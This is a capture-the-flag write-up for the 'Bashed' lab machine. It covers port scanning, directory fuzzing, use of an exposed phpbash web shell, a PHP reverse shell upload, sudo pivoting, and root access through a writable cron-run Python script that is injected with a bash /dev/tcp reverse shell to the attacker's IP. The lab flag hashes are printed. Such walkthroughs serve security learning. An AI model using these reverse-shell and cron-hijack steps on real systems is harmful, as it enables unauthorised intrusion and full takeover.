# CTF Writeup: Bashed

## Lab Description

Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted.

---


## Reconaissance

An initial scan revealed the following information about the services running on the target system.


```
nmap -A -p- --min-rate 10000 10.129.43.159
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 13:28 EDT
Nmap scan report for 10.129.43.159
Host is up (0.017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
32716/tcp filtered unknown
42792/tcp filtered unknown
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   16.20 ms 10.10.14.1
2   16.29 ms 10.129.43.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.92 seconds
```

Analyzing the webpage, it tells us that there is an tool installed called "phpbash". Which is an interactive web shell. Let's find out where it is saved!

```
 gobuster dir -u http://10.129.43.159/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.43.159/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.43.159/images/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.43.159/uploads/]
/php                  (Status: 301) [Size: 312] [--> http://10.129.43.159/php/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.43.159/css/]
/dev                  (Status: 301) [Size: 312] [--> http://10.129.43.159/dev/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.43.159/js/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.43.159/fonts/]
```

We found it in /dev/phpbash.php and accessed an web shell as user www-data.

Let's try and upload an revshell script. 

We have full access on /var/www/html/uploads and wget binary is also installed on the target. Let's upload our malicious reverse shell script in /uploads.

```
python3 -m http.server 80
```

Started up listener on port 1337

```
nc -lvnp 1337
```

## Initial Access


Viewed the uploaded script on the url and gained RCE as user "www-data"


```
http://10.129.43.159/uploads/php_reverse_shell.php
```
```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.43.159] 47194
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:05:33 up 37 min,  0 users,  load average: 4.00, 3.99, 3.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Made sudo -l and saw that we can execute all commands without authentication as user "scriptmanager".


```
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Logged in as user scriptmanager.

```
$ sudo -u scriptmanager /bin/bash
```

Performed shell hardening.


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Retrieved user.txt in /home/arraxel directory.

```
3ecafe854c77e3688481ae145eb28545
```

## Privilege Escalation


Found an directory called /scripts inside it there is an interesting test.py script which creates an test.txt file which has root rights, i'm assuming there is an cronjob running in the background.
We have write access to the python script, let's modify it and implement an reverse shell!

```
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Modified script and prompted following command inside the test.py script!


```
echo 'import os

os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.186/8888 0>&1\"")
f = open("test.txt", "w")
f.write("testing 123!")
f.close()' > test.py
```


Started up listener on port 8888 and gained RCE as "root" user.


```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.43.159] 34006
bash: cannot set terminal process group (5902): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts#
```

Retrieved root.txt in /root directory.


```
fe57da84915d410efadf04d8fa54c2f8
```
